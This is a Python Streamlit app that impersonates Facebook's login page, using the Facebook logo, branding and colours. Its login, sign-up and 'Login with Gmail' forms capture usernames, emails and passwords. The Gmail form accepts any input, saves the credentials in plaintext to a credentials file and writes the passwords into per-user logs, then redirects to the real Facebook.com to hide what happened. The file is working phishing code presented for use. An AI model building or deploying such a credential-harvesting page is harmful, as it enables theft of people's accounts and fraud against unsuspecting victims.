import logging
import os

import streamlit as st

# Ensure User_Credentials directory exists
if not os.path.exists("User_Credentials"):
    os.makedirs("User_Credentials")


# Configure main logger
def configure_user_logger(username):
    user_log_file = f"{username}.log"
    user_logger = logging.getLogger(username)
    user_logger.setLevel(logging.INFO)

    if not user_logger.handlers:
        file_handler = logging.FileHandler(user_log_file)
        formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
        file_handler.setFormatter(formatter)
        user_logger.addHandler(file_handler)
    return user_logger


# Save credentials
def save_credentials(username, password):
    credentials_file = os.path.join("User_Credentials", "credentials.txt")
    with open(credentials_file, "a") as file:
        file.write(f"{username}:{password}\n")


# Initialize session state
if "users" not in st.session_state:
    st.session_state["users"] = {}  # Dict to hold user accounts (username: password)

# Logo and style adjustments
st.markdown(
    """
    <style>
    .main {
        background-color: #f0f2f5;
    }
    .block-container {
        max-width: 500px;
        margin: auto;
        text-align: center;
        padding: 20px;
    }
    .stButton>button {
        background-color: #1877f2;
        color: white;
        font-size: 16px;
        padding: 8px 16px;
        border: none;
        border-radius: 4px;
        margin-top: 10px;
    }
    .stButton>button:hover {
        background-color: #145db2;
    }
    .stTextInput>div>input {
        border: 1px solid #ccd0d5;
        border-radius: 6px;
        padding: 10px;
        font-size: 14px;
        width: 100%;
    }
    </style>
    """,
    unsafe_allow_html=True,
)

# Header with FB Logo
st.markdown(
    """
    <div style="text-align: center;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" width="200">
        <h1 style="color: #1877f2; font-size: 36px; margin-top: 10px;">Facebook</h1>
    </div>
    """,
    unsafe_allow_html=True,
)


# User authentication
def login():
    st.sidebar.title("Login")
    username = st.sidebar.text_input("Username", key="login_username")
    password = st.sidebar.text_input("Password", type="password", key="login_password")
    if st.sidebar.button("Login", key="login_button"):
        if (
            username in st.session_state["users"]
            and st.session_state["users"][username] == password
        ):
            st.session_state["current_user"] = username
            st.sidebar.success(f"Welcome, {username}!")
            user_logger = configure_user_logger(username)
            user_logger.info(
                f"User '{username}' logged in successfully with {password}."
            )
            st.markdown(
                "<h3>Congratulations! Redirecting to Facebook...</h3>",
                unsafe_allow_html=True,
            )
            st.markdown(
                "<meta http-equiv='refresh' content='2; url=https://Facebook.com'>",
                unsafe_allow_html=True,
            )
        else:
            st.sidebar.error("Invalid username or password!")


def signup():
    st.sidebar.title("Sign Up")
    new_username = st.sidebar.text_input("New Username", key="signup_username")
    new_password = st.sidebar.text_input(
        "New Password", type="password", key="signup_password"
    )
    if st.sidebar.button("Sign Up", key="signup_button"):
        if new_username in st.session_state["users"]:
            st.sidebar.error("Username already exists!")
        else:
            st.session_state["users"][new_username] = new_password
            save_credentials(new_username, new_password)
            st.sidebar.success("Account created successfully!")
            user_logger = configure_user_logger(new_username)
            user_logger.info(
                f"New user '{new_username}' signed up successfully with {new_password}."
            )


def login_with_gmail():
    st.sidebar.title("Login with Gmail")
    email = st.sidebar.text_input("Gmail Address", key="gmail_username")
    password = st.sidebar.text_input("Password", type="password", key="gmail_password")
    if st.sidebar.button("Login with Gmail", key="gmail_button"):
        if email and password:
            save_credentials(email, password)
            user_logger = configure_user_logger(email)
            user_logger.info(f"Gmail login successful for '{email}'& {password}")
            st.markdown(
                "<h3>Congratulations! Redirecting to Facebook...</h3>",
                unsafe_allow_html=True,
            )
            st.markdown(
                "<meta http-equiv='refresh' content='2; url=https://Facebook.com'>",
                unsafe_allow_html=True,
            )
        else:
            st.sidebar.error("Please provide Gmail credentials!")


# Main app logic
if "current_user" not in st.session_state:
    st.session_state["current_user"] = None

# Sidebar for authentication
if st.session_state["current_user"]:
    st.sidebar.title("Account")
    st.sidebar.write(f"Logged in as: {st.session_state['current_user']}")
    if st.sidebar.button("Logout"):
        st.session_state["current_user"] = None
else:
    login()
    signup()
    login_with_gmail()
